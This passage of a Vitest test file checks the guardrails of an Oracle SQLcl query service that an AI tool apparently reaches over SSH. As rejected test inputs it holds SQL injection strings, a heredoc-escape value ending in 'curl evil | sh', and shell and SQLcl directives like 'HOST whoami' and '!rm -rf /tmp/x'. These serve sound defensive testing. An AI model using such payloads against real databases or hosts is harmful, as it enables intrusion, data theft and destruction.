import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  stripCommentsAndLiterals,
  assertReadOnlyQuery,
  applyQueryLimit,
  extractJsonFromSqlclOutput,
  extractOracleError,
  executeOracleQuery,
  executeOracleDescribe,
  testOracleConnection,
  saveOracleToolConfig,
  getOracleConnectionProfiles,
  saveOracleConnectionProfiles,
  resolveOracleConnection,
  listOracleConnectionSummaries,
  getOracleToolConfig,
  safeOracleIdentifier,
  escapeOracleLikeFilter,
  assertSqlclSingleStatement,
  safeOracleObjectIdentifier,
  assertOracleObjectType,
  ORACLE_OBJECT_TYPES,
  redactOracleText,
  buildOracleGrid,
  isOracleSourceObjectType,
} from '../oracleSqlclService';
import {
  ORACLE_TOOL_CONFIG_KEY,
  ORACLE_TOOL_CONFIG_LIST_KEY,
  type OracleConnectionProfile,
} from '../../../types/oracleSqlcl';
import * as sshService from '../../sshService';

describe('oracleSqlclService - Guardrails & Safety', () => {
  it('stripCommentsAndLiterals removes multi-line and single-line comments and string literals', () => {
    const sql = `
      -- single line comment with insert
      /* multi line
         comment with delete
      */
      SELECT id, 'this is an insert statement inside string' AS text
      FROM users WHERE name = 'O''Reilly';
    `;
    const stripped = stripCommentsAndLiterals(sql);
    expect(stripped).not.toContain('single line comment');
    expect(stripped).not.toContain('multi line');
    expect(stripped).not.toContain('this is an insert statement');
    expect(stripped).toContain("''");
  });

  it('assertReadOnlyQuery allows valid SELECT and WITH queries', () => {
    expect(() => assertReadOnlyQuery('SELECT * FROM employees')).not.toThrow();
    expect(() => assertReadOnlyQuery('select id, name from departments where dept_id = 10')).not.toThrow();
    expect(() =>
      assertReadOnlyQuery(`
        WITH dept_avg AS (
          SELECT dept_id, AVG(salary) as avg_sal FROM employees GROUP BY dept_id
        )
        SELECT * FROM dept_avg
      `)
    ).not.toThrow();
  });

  it('assertReadOnlyQuery blocks mutating DDL/DML and PL/SQL blocks', () => {
    expect(() => assertReadOnlyQuery('INSERT INTO users VALUES (1, "hack")')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('UPDATE users SET name = "hack"')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('DELETE FROM users')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('DROP TABLE users')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('TRUNCATE TABLE logs')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('ALTER TABLE users ADD col1 VARCHAR2(10)')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('BEGIN evil_proc(); END;')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('EXEC dbms_lock.sleep(10)')).toThrow(
      /Bị từ chối/
    );
    expect(() => assertReadOnlyQuery('SELECT * FROM users; DROP TABLE logs;')).toThrow(
      /Bị từ chối/
    );
  });

  it('applyQueryLimit wraps query without pagination with ROWNUM', () => {
    const wrapped = applyQueryLimit('SELECT * FROM orders', 50);
    expect(wrapped).toBe('SELECT * FROM (\nSELECT * FROM orders\n) WHERE ROWNUM <= 50');
  });

  it('applyQueryLimit does not re-wrap query that already has ROWNUM or FETCH FIRST', () => {
    const sql1 = 'SELECT * FROM orders WHERE ROWNUM <= 10;';
    expect(applyQueryLimit(sql1, 50)).toBe('SELECT * FROM orders WHERE ROWNUM <= 10');

    const sql2 = 'SELECT * FROM orders FETCH FIRST 20 ROWS ONLY';
    expect(applyQueryLimit(sql2, 50)).toBe(sql2);
  });

  it('extractJsonFromSqlclOutput parses clean and banner-prefixed JSON', () => {
    const cleanJson = '[{"ID": 1, "NAME": "Alice"}]';
    expect(extractJsonFromSqlclOutput(cleanJson)).toEqual([{ ID: 1, NAME: 'Alice' }]);

    const outputWithBanner = `
Connected to:
Oracle Database 19c Enterprise Edition
[{"ID": 2, "NAME": "Bob"}]
Disconnected from Oracle Database.
    `;
    expect(extractJsonFromSqlclOutput(outputWithBanner)).toEqual([{ ID: 2, NAME: 'Bob' }]);
  });

  it('extractOracleError identifies ORA- and SP2- error codes', () => {
    expect(extractOracleError('ORA-00942: table or view does not exist', '')).toBe(
      'ORA-00942: table or view does not exist'
    );
    expect(extractOracleError('', 'SP2-0310: unable to open file')).toBe(
      'SP2-0310: unable to open file'
    );
    expect(extractOracleError('All good', '')).toBeNull();
  });

  // WR-03: identifier validation + LIKE escaping helpers.
  it('safeOracleIdentifier accepts valid identifiers (trim + uppercase) and rejects injection', () => {
    expect(safeOracleIdentifier('  employees ', 'Tên bảng')).toBe('EMPLOYEES');
    expect(safeOracleIdentifier('my$table#2', 'Tên bảng')).toBe('MY$TABLE#2');
    expect(() => safeOracleIdentifier("EMP' UNION SELECT password FROM secret_table --", 'Tên bảng')).toThrow(
      /không hợp lệ/
    );
    expect(() => safeOracleIdentifier('1BAD', 'Tên bảng')).toThrow(/không hợp lệ/);
    expect(() => safeOracleIdentifier('A B', 'Tên bảng')).toThrow(/không hợp lệ/);
    expect(() => safeOracleIdentifier(undefined, 'Tên schema')).toThrow(/không hợp lệ/);
  });

  it('escapeOracleLikeFilter doubles single quotes so a filter cannot break the literal', () => {
    expect(escapeOracleLikeFilter("O'REILLY")).toBe("O''REILLY");
    expect(escapeOracleLikeFilter("' UNION SELECT 1 --")).toBe("'' UNION SELECT 1 --");
    expect(() => escapeOracleLikeFilter("x\nEOF_ORACLE_SQLCL\ncurl evil | sh")).toThrow(/xuống dòng/);
  });

  it('assertSqlclSingleStatement blocks multi-statements and directives', () => {
    expect(assertSqlclSingleStatement('SELECT 1 FROM DUAL;')).toBe('SELECT 1 FROM DUAL');
    expect(() => assertSqlclSingleStatement('SELECT 1; DELETE FROM employees')).toThrow(/một câu lệnh/);
    expect(() => assertSqlclSingleStatement("SELECT 1; DELETE FROM employees WHERE x = 'a;b'")).toThrow(/một câu lệnh/);
    for (const directive of ['SET SQLFORMAT JSON', 'HOST whoami', 'SPOOL /tmp/x', '@script.sql', '/', '!rm -rf /tmp/x', 'EXIT']) {
      expect(() => assertSqlclSingleStatement(`SELECT 1 FROM DUAL;\n${directive}`), directive).toThrow(/Bị từ chối/);
    }
    expect(() => assertSqlclSingleStatement("SELECT 'SET HOST' FROM DUAL")).not.toThrow();
    expect(() => assertSqlclSingleStatement('SELECT 1 /* SET HOST */ FROM DUAL')).not.toThrow();
    // Return the ORIGINAL SQL: stripping literals for inspection must never rewrite the query.
    expect(assertSqlclSingleStatement("SELECT name FROM emp WHERE name = 'Alice'")).toBe(
      "SELECT name FROM emp WHERE name = 'Alice'"
    );
  });

  it('allows SELECTs whose column names look like DDL keywords', () => {
    expect(() => assertReadOnlyQuery('SELECT comment, lock_version, flashback_date FROM posts')).not.toThrow();
    expect(() => assertReadOnlyQuery('SELECT * FROM posts FOR UPDATE')).toThrow(/Bị từ chối/);
  });

  it('safeOracleObjectIdentifier accepts quoted mixed case and rejects injection', () => {
    expect(safeOracleObjectIdentifier('HR."MixCase"', 'Tên schema')).toBe('HR."MixCase"');
    expect(safeOracleObjectIdentifier('hr.employees', 'Tên đối tượng')).toBe('HR.EMPLOYEES');
    expect(() => safeOracleObjectIdentifier('HR."X" UNION SELECT 1', 'Tên đối tượng')).toThrow(/không hợp lệ/);
    expect(() => safeOracleObjectIdentifier('HR."A""B"', 'Tên đối tượng')).toThrow(/không hợp lệ/);
    expect(() => safeOracleObjectIdentifier("HR' OR 1=1 --", 'Tên đối tượng')).toThrow(/không hợp lệ/);
  });

  it('object type whitelist rejects arbitrary types', () => {
    expect(Object.keys(ORACLE_OBJECT_TYPES)).toContain('MATERIALIZED VIEW');
    expect(assertOracleObjectType('package body')).toBe('PACKAGE BODY');
    expect(isOracleSourceObjectType('PACKAGE BODY')).toBe(true);
    expect(isOracleSourceObjectType('TABLE')).toBe(false);
    expect(() => assertOracleObjectType("TABLE' OR 1=1")).toThrow(/không hợp lệ/);
  });

  it('redactOracleText masks full connection string and password fragments', () => {
    const config = { sshConfigId: 'ssh-1', connectionString: 'hr/s3cret@dbhost:1521/SRV' };
    expect(redactOracleText('ORA-01017: hr/s3cret@dbhost:1521/SRV failed s3cret', config)).not.toContain('s3cret');
    expect(redactOracleText('login as /s3cret@dbhost failed', config)).not.toContain('s3cret');
  });

  it('buildOracleGrid caps rows, cells and payload', () => {
    const payload = Array.from({ length: 1200 }, (_, i) => ({ ID: i, TEXT: 'x'.repeat(2100) }));
    const grid = buildOracleGrid(payload);
    expect(grid.columns).toEqual(['ID', 'TEXT']);
    expect(grid.rows.length).toBeLessThanOrEqual(1000);
    expect(grid.rowCount).toBe(1200);
    expect(grid.truncated).toBe(true);
    expect((grid.rows[0]![1] as string).length).toBeLessThanOrEqual(2001);
    // A payload that exceeds the cap on its very first row must still show one (capped) row,
    // not an empty grid with rowCount > 0.
    const single = buildOracleGrid(
      Array.from({ length: 400 }, (_, i) => ({ ID: i, TEXT: 'x'.repeat(2100) }))
    );
    expect(single.rows.length).toBeGreaterThanOrEqual(1);
    expect(single.truncated).toBe(true);
  });
});

describe('oracleSqlclService - Execution & SSH mocking', () => {
  const fakeDb: any = {
    settings: {
      get: vi.fn(),
      put: vi.fn(),
      delete: vi.fn(),
    },
    transaction: vi.fn(async (_mode: string, _tables: unknown, fn: () => Promise<void>) => fn()),
  };

  /** Seed one active profile under the new list key, keyed by settings key. */
  const seedActiveProfile = (connection: Partial<OracleConnectionProfile>) => {
    fakeDb.settings.get.mockImplementation(async (key: string) =>
      key === ORACLE_TOOL_CONFIG_LIST_KEY
        ? {
            key,
            value: {
              profiles: [
                {
                  id: 'default-profile',
                  name: 'Default',
                  environment: 'SIT',
                  isActive: true,
                  sshConfigId: 'ssh-1',
                  connectionString: 'user/pass@host:1521/srv',
                  ...connection,
                },
              ],
            },
          }
        : undefined
    );
  };

  beforeEach(() => {
    // The shared fakeDb persists across cases: clearAllMocks drops call history but NOT
    // implementations installed by earlier cases (mockImplementation / Once queues).
    // Reset the db mocks explicitly; sshService spies use Once values queued per case.
    fakeDb.settings.get.mockReset();
    fakeDb.settings.put.mockReset();
    fakeDb.settings.delete.mockReset();
    fakeDb.transaction.mockReset();
    fakeDb.transaction.mockImplementation(
      async (_mode: string, _tables: unknown, fn: () => Promise<void>) => fn()
    );
    vi.restoreAllMocks();
  });

  it('returns a helpful error when the connection is not configured', async () => {
    fakeDb.settings.get.mockResolvedValueOnce({
      value: { sshConfigId: '', connectionString: '' },
    });

    const resStr = await executeOracleQuery({ query: 'SELECT 1 FROM DUAL' }, fakeDb);
    const res = JSON.parse(resStr);
    expect(res.success).toBe(false);
    expect(res.error).toContain('chưa được cấu hình');
  });

  it('executes read-only query over mocked SSH', async () => {
    seedActiveProfile({ maxRows: 100 });

    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
      stdout: '[{"COL1": "val1"}]',
      stderr: '',
      exitStatus: 0,
    });

    const resStr = await executeOracleQuery({ query: 'SELECT COL1 FROM MY_TABLE' }, fakeDb);
    const res = JSON.parse(resStr);

    expect(res.success).toBe(true);
    expect(res.action).toBe('query');
    expect(res.data).toEqual([{ COL1: 'val1' }]);
    expect(sshService.execRemoteCommand).toHaveBeenCalled();
  });

  it('keeps SQL literals intact and uses a per-call heredoc delimiter', async () => {
    seedActiveProfile({ maxRows: 100 });
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
      stdout: '[]', stderr: '', exitStatus: 0,
    });
    const sql = "SELECT name FROM emp WHERE name = 'Alice' AND dept = 'SALES'";
    const resStr = await executeOracleQuery({ query: sql }, fakeDb);
    const res = JSON.parse(resStr);
    expect(res.success).toBe(true);
    expect(res.executedSql).toContain("'Alice'");
    expect(res.executedSql).toContain("'SALES'");
    const command = (sshService.execRemoteCommand as any).mock.calls[0][1] as string;
    expect(command).toMatch(/<< 'EOF_ORACLE_SQLCL_[0-9A-F]{32}'/);
    expect(command.split(/\r?\n/).filter((line) => line.startsWith('EOF_ORACLE_SQLCL'))).toHaveLength(1);
  });

  it('executes describe_table over mocked SSH', async () => {
    seedActiveProfile({});

    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
      stdout: '[{"COLUMN_NAME": "ID", "FULL_DATA_TYPE": "NUMBER(10,0)", "NULLABLE": "N"}]',
      stderr: '',
      exitStatus: 0,
    });

    const resStr = await executeOracleDescribe(
      { action: 'describe_table', tableOrView: 'EMPLOYEES' },
      fakeDb
    );
    const res = JSON.parse(resStr);

    expect(res.success).toBe(true);
    expect(res.action).toBe('describe_table');
    expect(res.columns).toEqual([
      { COLUMN_NAME: 'ID', FULL_DATA_TYPE: 'NUMBER(10,0)', NULLABLE: 'N' },
    ]);
  });

  // WR-03: a model-supplied identifier carrying an injected UNION must be rejected before
  // any SSH script is sent, and must surface through the JSON { success:false, error } path.
  it('rejects an injected tableOrView in describe_table without reaching SSH', async () => {
    seedActiveProfile({});
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[{"OK": 1}]',
      stderr: '',
      exitStatus: 0,
    });

    const payload = "EMP' UNION SELECT password FROM secret_table --";
    const res = JSON.parse(
      await executeOracleDescribe(
        { action: 'describe_table', tableOrView: payload },
        fakeDb
      )
    );

    expect(res.success).toBe(false);
    expect(res.error).toMatch(/không hợp lệ/);
    expect(res.error).not.toContain('secret_table');
    expect(execSpy).not.toHaveBeenCalled();
  });

  it('rejects an injected schema in list_tables and get_ddl without reaching SSH', async () => {
    seedActiveProfile({});
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[]',
      stderr: '',
      exitStatus: 0,
    });
    const payload = "HR' OR 1=1 --";

    const listRes = JSON.parse(
      await executeOracleDescribe({ action: 'list_tables', schema: payload }, fakeDb)
    );
    expect(listRes.success).toBe(false);
    expect(listRes.error).toMatch(/không hợp lệ/);

    const ddlRes = JSON.parse(
      await executeOracleDescribe(
        { action: 'get_ddl', tableOrView: 'EMPLOYEES', schema: payload },
        fakeDb
      )
    );
    expect(ddlRes.success).toBe(false);
    expect(ddlRes.error).toMatch(/không hợp lệ/);
    expect(execSpy).not.toHaveBeenCalled();
  });

  it('keeps a LIKE search filter as an escaped literal in the list_tables script', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[]',
      stderr: '',
      exitStatus: 0,
    });

    const resStr = await executeOracleDescribe(
      { action: 'list_tables', search: "O'REILLY" },
      fakeDb
    );
    expect(JSON.parse(resStr).success).toBe(true);
    const remoteCommand = execSpy.mock.calls[0]?.[1] as string;
    // The quote is doubled inside the literal; no injected `...%' OR ...` structure exists.
    expect(remoteCommand).toContain("LIKE '%O''REILLY%'");
    expect(remoteCommand).toContain('SET TRANSACTION READ ONLY;');
  });

  it('get_ddl script includes SET TRANSACTION READ ONLY', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: 'CREATE TABLE ...',
      stderr: '',
      exitStatus: 0,
    });

    const resStr = await executeOracleDescribe(
      { action: 'get_ddl', tableOrView: 'employees', schema: 'hr' },
      fakeDb
    );
    expect(JSON.parse(resStr).success).toBe(true);
    const remoteCommand = execSpy.mock.calls[0]?.[1] as string;
    expect(remoteCommand).toContain('SET TRANSACTION READ ONLY;');
    expect(remoteCommand).toContain("GET_DDL('TABLE', 'EMPLOYEES', 'HR')");
  });

  it('tests Oracle connection successfully', async () => {
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
      stdout: 'TEST_OK|Oracle Database 19c Enterprise Edition',
      stderr: '',
      exitStatus: 0,
    });

    const testRes = await testOracleConnection(
      {
        sshConfigId: 'ssh-1',
        connectionString: 'user/pass@host:1521/srv',
      },
      fakeDb
    );

    expect(testRes.ok).toBe(true);
    expect(testRes.version).toContain('Oracle Database 19c');
  });

  it('saves Oracle tool config into db.settings', async () => {
    await saveOracleToolConfig(
      {
        sshConfigId: 'ssh-1',
        connectionString: 'user/pass@host:1521/srv',
      },
      fakeDb
    );

    expect(fakeDb.settings.put).toHaveBeenCalledWith({
      key: 'oracle_ai_tool_config',
      value: expect.objectContaining({ sshConfigId: 'ssh-1' }),
    });
  });

  // Regression: the model tool-call id must reach the SSH transport so Rust can cancel by
  // id alone. A dropped id makes cancellation impossible and was the root cause of the
  // "process survives tab switch / cannot stop one task" failure class.
  it('passes the model tool-call id down to the SSH transport', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
      { id: 'ssh-1', name: 'Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
      stdout: '[{"OK": 1}]',
      stderr: '',
      exitStatus: 0,
    });

    await executeOracleQuery({ query: 'SELECT 1 FROM DUAL' }, fakeDb, 'call-abc-123');

    expect(execSpy).toHaveBeenCalledWith(
      expect.anything(),
      expect.any(String),
      'secret-pass',
      'call-abc-123'
    );
  });

  // Regression: no time-based rejection anywhere in the tool path. Advancing the clock by
  // an hour while the transport stays pending must NOT settle the call with a timeout —
  // only an explicit cancel (or app exit) may end a task.
  it('migrates the legacy single config into active profile #1 then deletes the legacy row', async () => {
    const legacyConfig = {
      sshConfigId: 'ssh-legacy',
      connectionString: 'legacy_user/legacy_pass@legacyhost:1521/LEGACY',
      sqlclPath: '/opt/sqlcl/bin/sql',
      envVars: 'export TNS_ADMIN=/opt/oracle/network/admin',
      maxRows: 250,
      lastTestedAt: '2026-01-02T03:04:05.000Z',
      lastTestStatus: 'ok',
    };
    fakeDb.settings.get.mockImplementation(async (key: string) =>
      key === ORACLE_TOOL_CONFIG_LIST_KEY
        ? undefined
        : key === ORACLE_TOOL_CONFIG_KEY
          ? { key, value: legacyConfig }
          : undefined
    );
    fakeDb.settings.delete.mockImplementation(async (_key: string) => { /* verified via assertion below */ });

    const profiles = await getOracleConnectionProfiles(fakeDb);

    expect(profiles).toHaveLength(1);
    expect(profiles[0]).toMatchObject({
      ...legacyConfig,
      name: expect.any(String),
      environment: expect.any(String),
      isActive: true,
    });
    expect(profiles[0]?.id).toMatch(/^[0-9a-f-]{36}$/);
    expect(fakeDb.settings.put).toHaveBeenCalledWith({
      key: ORACLE_TOOL_CONFIG_LIST_KEY,
      value: { profiles: [expect.objectContaining({ ...legacyConfig, isActive: true })] },
    });
    expect(fakeDb.settings.delete).toHaveBeenCalledWith(ORACLE_TOOL_CONFIG_KEY);
  });

  it('keeps the legacy config readable through the compatibility accessor after migration', async () => {
    const profile: OracleConnectionProfile = {
      id: '11111111-1111-4111-8111-111111111111',
      name: 'Primary',
      environment: 'SIT',
      isActive: true,
      sshConfigId: 'ssh-1',
      connectionString: 'user/pass@sithost:1521/SIT',
      maxRows: 100,
    };
    fakeDb.settings.get.mockImplementation(async (key: string) =>
      key === ORACLE_TOOL_CONFIG_KEY ? undefined : { key, value: { profiles: [profile] } }
    );

    const cfg = await getOracleToolConfig(fakeDb);
    expect(cfg).toMatchObject({
      sshConfigId: 'ssh-1',
      connectionString: 'user/pass@sithost:1521/SIT',
    });
  });

  it('saves the profile list under the denylisted settings key', async () => {
    const profile: OracleConnectionProfile = {
      id: '22222222-2222-4222-8222-222222222222',
      name: 'UAT',
      environment: 'UAT',
      isActive: true,
      sshConfigId: 'ssh-1',
      connectionString: 'user/pass@uathost:1521/UAT',
    };
    await saveOracleConnectionProfiles([profile], fakeDb);
    expect(fakeDb.settings.put).toHaveBeenCalledWith({
      key: ORACLE_TOOL_CONFIG_LIST_KEY,
      value: { profiles: [profile] },
    });
  });

  it('resolves selectors by exact id, case-insensitive name/env, then active fallback', () => {
    const profiles: OracleConnectionProfile[] = [
      {
        id: 'aaa', name: 'Main SIT', environment: 'SIT', isActive: true,
        sshConfigId: 'ssh-1', connectionString: 'u/p@sit:1521/SIT',
      },
      {
        id: 'bbb', name: 'UAT Box', environment: 'UAT', isActive: false,
        sshConfigId: 'ssh-2', connectionString: 'u/p@uat:1521/UAT',
      },
    ];
    expect(resolveOracleConnection(profiles, { connectionId: 'bbb' }).id).toBe('bbb');
    expect(resolveOracleConnection(profiles, { name: 'uat box' }).id).toBe('bbb');
    expect(resolveOracleConnection(profiles, { environment: 'sit' }).id).toBe('aaa');
    expect(resolveOracleConnection(profiles).id).toBe('aaa');
    expect(listOracleConnectionSummaries(profiles)).toEqual([
      { id: 'aaa', name: 'Main SIT', environment: 'SIT', isActive: true },
      { id: 'bbb', name: 'UAT Box', environment: 'UAT', isActive: false },
    ]);
  });

  it('unknown selector error lists only names/environments, never a connection string', () => {
    const profiles: OracleConnectionProfile[] = [
      {
        id: 'aaa', name: 'Main SIT', environment: 'SIT', isActive: true,
        sshConfigId: 'ssh-1', connectionString: 'secret_user/secret_pass@prodhost:1521/PROD',
      },
    ];
    let message = '';
    try {
      resolveOracleConnection(profiles, { name: 'DOES_NOT_EXIST' });
    } catch (err: any) {
      message = err?.message || '';
    }
    expect(message).toContain('Main SIT');
    expect(message).not.toContain('secret_pass');
    expect(message).not.toContain('@prodhost');
    expect(message).not.toContain('ssh-1');
  });

  it('routes a query to the selected profile under the unchanged read-only guard', async () => {
    const profiles: OracleConnectionProfile[] = [
      {
        id: 'sit-id', name: 'SIT', environment: 'SIT', isActive: true,
        sshConfigId: 'ssh-1', connectionString: 'sit_user/sit_pass@sithost:1521/SIT', maxRows: 100,
      },
      {
        id: 'uat-id', name: 'UAT', environment: 'UAT', isActive: false,
        sshConfigId: 'ssh-2', connectionString: 'uat_user/uat_pass@uathost:1521/UAT', maxRows: 100,
      },
    ];
    fakeDb.settings.get.mockImplementation(async (key: string) =>
      key === ORACLE_TOOL_CONFIG_LIST_KEY ? { key, value: { profiles } } : undefined
    );
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([
      { id: 'ssh-1', name: 'SIT Bastion' } as any,
      { id: 'ssh-2', name: 'UAT Bastion' } as any,
    ]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[{"OK": 1}]', stderr: '', exitStatus: 0,
    });

    const res = JSON.parse(await executeOracleQuery(
      { query: 'SELECT 1 FROM DUAL', name: 'UAT' }, fakeDb
    ));
    expect(res.success).toBe(true);
    const remoteCommand = execSpy.mock.calls[0]?.[1] as string;
    expect(remoteCommand).toContain('uat_user/uat_pass@uathost:1521/UAT');
    expect(remoteCommand).not.toContain('sit_user');

    const blocked = JSON.parse(await executeOracleQuery(
      { query: 'DELETE FROM employees', name: 'UAT' }, fakeDb
    ));
    expect(blocked.success).toBe(false);
    expect(blocked.error).toMatch(/Bị từ chối/);
  });

  it('returns an error, never silent empty data, when the remote command fails with empty stdout', async () => {
    // Regression: a non-selected SSH host / missing sqlcl / bad login produces a nonzero exit
    // and empty stdout. No ORA-/SP2- token appears, so extractOracleError returns null and the
    // old code reported { success: true, data: [] } — exactly the "empty result" symptom.
    seedActiveProfile({ connectionString: 'uat_user/uat_pass@uathost:1521/UAT' });
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'UAT' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '',
      stderr: 'Permission denied (publickey).',
      exitStatus: 255,
    });

    const res = JSON.parse(await executeOracleQuery({ query: 'SELECT 1 FROM DUAL' }, fakeDb));
    expect(res.success).toBe(false);
    expect(res.error).toBeTruthy();
    expect(res.error).not.toContain('uat_pass');
  });

  it('counts rows from SQLcl JSON results[].items (the shape SQLcl actually emits)', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'Bastion' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: JSON.stringify({ results: [{ items: [{ X: 1 }] }] }),
      stderr: '',
      exitStatus: 0,
    });

    const res = JSON.parse(await executeOracleQuery({ query: 'SELECT 1 AS X FROM DUAL' }, fakeDb));
    expect(res.success).toBe(true);
    expect(res.rowCount).toBe(1);
  });

  it('multi-statement and SQLcl directive are rejected before any SSH command is sent', async () => {
    seedActiveProfile({});
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[]', stderr: '', exitStatus: 0,
    });
    for (const query of [
      'SELECT 1 FROM DUAL; DELETE FROM employees',
      'SELECT 1 FROM DUAL; HOST whoami',
      'SELECT 1 FROM DUAL;\n@/tmp/evil.sql',
    ]) {
      const res = JSON.parse(await executeOracleQuery({ query }, fakeDb));
      expect(res.success).toBe(false);
      expect(res.error).toMatch(/Bị từ chối/);
      expect(res.error).not.toContain('s3cret');
    }
    expect(execSpy).not.toHaveBeenCalled();
  });

  it('query payload exposes columns/rows from the same parsed JSON and redacts errors', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'B' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[{"ID": 1, "NAME": "A"}]', stderr: '', exitStatus: 0,
    });
    const res = JSON.parse(await executeOracleQuery({ query: 'SELECT ID, NAME FROM T' }, fakeDb));
    expect(res.columns).toEqual(['ID', 'NAME']);
    expect(res.rows).toEqual([[1, 'A']]);
    expect(res.executedSql).not.toContain('pass@');
  });

  it('redacts connection secrets that leak into stdout error text', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'B' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: 'ORA-01017: invalid credentials user/pass@host:1521/srv', stderr: '', exitStatus: 0,
    });
    const res = JSON.parse(await executeOracleQuery({ query: 'SELECT 1 FROM DUAL' }, fakeDb));
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/ORA-01017/);
    expect(res.error).not.toContain('user/pass@host:1521/srv');
    expect(res.error).not.toContain('pass@host');
  });

  it('metadata search matches both raw and Vietnamese-folded terms', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'B' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[]', stderr: '', exitStatus: 0,
    });
    await executeOracleDescribe(
      { action: 'list_objects', search: 'Đơn hàng', searchAlt: 'don hang', pageSize: 10 },
      fakeDb
    );
    const command = execSpy.mock.calls[0]?.[1] as string;
    expect(command).toContain("UPPER(OBJECT_NAME) LIKE '%ĐƠN HÀNG%'");
    expect(command).toContain("UPPER(OBJECT_NAME) LIKE '%DON HANG%'");
    expect(command).toContain(' OR ');
  });

  it('metadata actions build whitelisted, paginated ALL_* scripts and cap source', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'B' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    const execSpy = vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: '[{"USERNAME":"HR"},{"USERNAME":"SCOTT"}]', stderr: '', exitStatus: 0,
    });

    const schemas = JSON.parse(await executeOracleDescribe(
      { action: 'list_schemas', search: "HR' OR 1=1", pageOffset: 400, pageSize: 9999 }, fakeDb
    ));
    expect(schemas.success).toBe(true);
    let command = execSpy.mock.calls[0]?.[1] as string;
    expect(command).toContain('FROM ALL_USERS');
    expect(command).toContain("LIKE '%HR'' OR 1=1%'");
    expect(command).toContain('OFFSET 400 ROWS FETCH NEXT 201 ROWS ONLY');
    expect(command).toContain('SET TRANSACTION READ ONLY;');

    execSpy.mockClear();
    const objects = JSON.parse(await executeOracleDescribe(
      { action: 'list_objects', schema: 'hr', objectType: 'package body', pageOffset: 0, pageSize: 10 }, fakeDb
    ));
    expect(objects.success).toBe(true);
    command = execSpy.mock.calls[0]?.[1] as string;
